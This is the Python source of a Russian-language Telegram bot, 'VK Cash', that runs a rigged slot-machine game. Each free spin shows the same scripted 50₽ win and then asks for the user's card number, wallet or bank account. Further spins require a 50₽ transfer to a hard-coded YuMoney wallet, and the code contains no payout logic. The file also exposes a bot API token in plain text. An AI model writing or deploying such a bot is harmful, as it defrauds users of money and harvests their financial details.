import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

user_states = {}
first_spin_done = {}
payment_requested = {}
payment_pending = {}  # user_id -> {'code': str}

CODES_FILE = "codes.json"

if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

def get_main_markup(user_id):
    markup = InlineKeyboardMarkup()
    if not first_spin_done.get(user_id):
        markup.add(InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"))
    elif user_id in payment_pending:
        pass  # ничего, ждём подтверждение от админа
    else:
        markup.add(InlineKeyboardButton("💵 Оплатить повторную прокрутку 50₽", callback_data="pay50"))
        if payment_requested.get(user_id):
            markup.add(InlineKeyboardButton("✅ Я оплатил", callback_data="confirm_payment"))
    markup.add(InlineKeyboardButton("🛒 Магазин", callback_data="shop"),
               InlineKeyboardButton("🏆 Топ", callback_data="leaderboard"))
    markup.add(InlineKeyboardButton("📜 Правила", callback_data="rules"),
               InlineKeyboardButton("❓ FAQ", callback_data="faq"))
    markup.add(InlineKeyboardButton("📋 Политика", callback_data="policy"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("👑 Админ-панель", callback_data="admin"))
    return markup

@bot.message_handler(commands=['start'])
def send_start(message):
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid) and uid not in payment_pending:
        bot.answer_callback_query(call.id, "Вы уже использовали бесплатную попытку.")
        return
    if not first_spin_done.get(uid):
        first_spin_done[uid] = True
    elif uid in payment_pending:
        del payment_pending[uid]
    amount = 50
    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    bot.send_message(call.message.chat.id, f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "pay50")
def handle_payment(call):
    uid = call.from_user.id
    payment_requested[uid] = True
    bot.send_message(call.message.chat.id, "💸 Переведите 50₽ на ЮMoney: `4100119077541618`\nНазвание: *Плачу значит верчу*", parse_mode="Markdown", reply_markup=get_main_markup(uid))

@bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
def handle_confirm(call):
    uid = call.from_user.id
    bot.send_message(call.message.chat.id, "🧾 Введите код оплаты (например: OP-1234):")
    bot.register_next_step_handler(call.message, handle_payment_code)

def handle_payment_code(message):
    uid = message.from_user.id
    code_entered = message.text.strip()
    payment_pending[uid] = {"code": code_entered}
    payment_requested.pop(uid, None)
    admin_text = f"🧾 Новый код оплаты от @{message.from_user.username or message.from_user.first_name}:\n\nID: {uid}\nКод: {code_entered}"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"approve_{uid}"))
    bot.send_message(ADMIN_ID, admin_text, reply_markup=markup)
    bot.send_message(uid, "⏳ Ожидаем подтверждения оплаты админом.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_payment(call):
    uid = int(call.data.split("_")[1])
    payment_pending.pop(uid, None)
    bot.send_message(uid, "✅ Оплата подтверждена! Теперь вы можете крутить колесо повторно.", reply_markup=get_main_markup(uid))
    bot.send_message(call.message.chat.id, "Оплата для игрока подтверждена.")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
        bot.process_new_updates([update])
        return "OK", 200
    return "VK Cash бот работает!", 200

if __name__ == '__main__':
    WEBHOOK_URL = "https://vk-cash-bot.onrender.com"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=WEBHOOK_URL)
    app.run(host='0.0.0.0', port=8080)